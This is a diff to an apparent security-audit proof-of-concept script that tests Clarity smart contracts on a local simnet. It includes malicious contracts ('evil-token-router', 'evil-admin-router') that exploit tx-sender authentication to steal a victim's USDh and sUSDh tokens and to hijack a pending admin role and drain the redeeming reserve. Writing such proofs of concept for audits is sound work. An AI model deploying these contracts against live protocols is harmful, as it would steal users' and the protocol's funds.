@@ -44,9 +44,8 @@ async function setup() {
 
 async function proveTokenTheft() {
   console.log('\n=== PoC #6: tx-sender token theft through malicious contract ===');
-  const { simnet, deployer, trader, attacker, victim, c, pub, balance } = await setup();
+  const { simnet, deployer, trader, attacker, victim, pub, balance } = await setup();
 
-  // Fund victim with 200 USDh through the real local minting path.
   expectCv('fund victim 200 USDh', pub('minting-otc', 'confirm-mint', [
     Cl.stringAscii('victim-200'),
     Cl.principal(victim),
@@ -54,7 +53,6 @@ async function proveTokenTheft() {
     Cl.uint(BASE),
   ], trader), '(ok true)');
 
-  // Convert half to sUSDh so both vulnerable token contracts hold victim funds.
   expectCv('victim stakes 100 USDh', pub('staking', 'stake', [Cl.uint(100n * BASE), Cl.none()], victim), '(ok true)');
   assert.equal(balance('usdh-token', victim), 100n * BASE);
   assert.equal(balance('susdh-token', victim), 100n * BASE);
@@ -62,9 +60,6 @@ async function proveTokenTheft() {
   const evilSource = `
     (define-public (steal-both (usdh-amount uint) (susdh-amount uint) (recipient principal))
       (begin
-        ;; tx-sender remains the external user who invoked this contract.
-        ;; Both tokens authorize sender == tx-sender even though this contract
-        ;; is the immediate contract-caller and has no allowance.
         (try! (contract-call? '${deployer}.usdh-token transfer usdh-amount tx-sender recipient none))
         (try! (contract-call? '${deployer}.susdh-token transfer susdh-amount tx-sender recipient none))
         (ok true)))
@@ -73,8 +68,6 @@ async function proveTokenTheft() {
   console.log(`deploy evil-token-router: ${cv(deployment)}`);
   const evil = `${attacker}.evil-token-router`;
 
-  // Victim calls ONLY the malicious contract. No USDh/sUSDh approval exists,
-  // and victim never directly invokes either token's transfer function.
   const stolen = simnet.callPublicFn(evil, 'steal-both', [
     Cl.uint(100n * BASE),
     Cl.uint(100n * BASE),
@@ -99,8 +92,8 @@ async function provePendingAdminHijack() {
   console.log('\n=== PoC #5: pending-admin tx-sender self-activation -> reserve drain ===');
   const { simnet, deployer, trader, attacker, victim: pendingAdmin, c, pub, ro, balance } = await setup();
   const redeemingReserve = c('redeeming-reserve');
+  const evil = `${attacker}.evil-admin-router`;
 
-  // Fund the real redeeming-reserve with 1000 USDh.
   expectCv('fund deployer 1000 USDh', pub('minting-otc', 'confirm-mint', [
     Cl.stringAscii('reserve-1000'),
     Cl.principal(deployer),
@@ -115,39 +108,27 @@ async function provePendingAdminHijack() {
   ], deployer), '(ok true)');
   assert.equal(balance('usdh-token', redeemingReserve), 1_000n * BASE);
 
+  // Clarity v2 does not expose `current-contract` as a value here. A malicious
+  // contract can trivially hard-code its own known deployment principal.
   const evilSource = `
     (define-public (activate-authorize-and-drain (amount uint) (recipient principal))
       (begin
-        ;; HQ authenticates activate-admin against tx-sender. In this nested
-        ;; call tx-sender is still the legitimately nominated pending admin.
         (try! (contract-call? '${deployer}.hq activate-admin tx-sender))
-
-        ;; Now the same preserved tx-sender is an active admin, so this nested
-        ;; call authorizes the malicious contract itself as protocol-active.
-        (try! (contract-call? '${deployer}.hq set-contract-active current-contract true))
-
-        ;; redeeming-reserve trusts any active protocol contract-caller and
-        ;; skips the manager-only authorized-recipient restriction.
+        (try! (contract-call? '${deployer}.hq set-contract-active '${evil} true))
         (contract-call? '${deployer}.redeeming-reserve transfer
           amount recipient '${deployer}.usdh-token none)))
   `;
   const deployment = simnet.deployContract('evil-admin-router', evilSource, { clarityVersion: 2 }, attacker);
   console.log(`deploy evil-admin-router: ${cv(deployment)}`);
-  const evil = `${attacker}.evil-admin-router`;
 
-  // Legitimate owner nominates pendingAdmin.
   expectCv('owner request-admin-update(pendingAdmin)', pub('hq', 'request-admin-update', [Cl.principal(pendingAdmin)], deployer), '(ok true)');
-
-  // Wait past the production 1008-burn-block activation delay.
   simnet.mineEmptyBlocks(1_010);
 
-  // pendingAdmin invokes ONLY attacker contract. It never directly invokes HQ,
-  // never approves evil as protocol, and never calls redeeming-reserve.
   const result = simnet.callPublicFn(evil, 'activate-authorize-and-drain', [
     Cl.uint(1_000n * BASE),
     Cl.principal(attacker),
   ], pendingAdmin);
-  expectCv('pendingAdmin -> evil-admin-router', result, '(ok (ok true))');
+  expectCv('pendingAdmin -> evil-admin-router', result, '(ok true)');
 
   const active = ro('hq', 'get-contract-active', [Cl.principal(evil)]);
   expectCv('hq.get-contract-active(evil)', active, 'true');
